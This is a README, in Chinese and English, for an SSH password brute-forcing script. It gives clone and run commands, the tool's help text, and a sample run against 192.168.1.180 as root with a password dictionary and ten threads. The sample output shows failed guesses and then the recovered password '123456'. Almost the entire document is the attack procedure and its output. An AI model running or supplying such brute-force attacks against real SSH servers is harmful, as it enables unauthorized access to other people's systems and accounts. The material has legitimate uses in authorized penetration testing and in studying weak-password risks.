# SSH_Bruteforce
#### 获取脚本

```Bash
git clone https://github.com/HZzz2/SSH_Bruteforce
```

#### 进入目录

```Bash
cd SSH_Bruteforce
```

#### 获取帮助

```Bash
python SSH_Bruteforce.py -h
'''

'''test
usage: SSH_Bruteforce.py [-h] -H HOST -u USER -f FILE -t THREAD

exmple: python3 SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10

optional arguments:

  -h, --help            show this help message and exit

  -H HOST, --host HOST  Hostname/IP       要爆破的主机IP

  -u USER, --user USER  Username          SSH用户名

  -f FILE, --file FILE  Password file     密码字典

  -t THREAD, --thread THREAD              线程数
    Thread number
```

#### 执行脚本

```Bash
python SSH_Bruteforce.py -H 192.168.1.180 -u root -f password.txt -t 10
```
```text
[-] 11 is not correct
[-] 44 is not correct
[-] 88 is not correct
[-] 55 is not correct
[-] 22 is not correct
[-] 77 is not correct
[+] 123456 is correct
SSH PassWord：123456
```



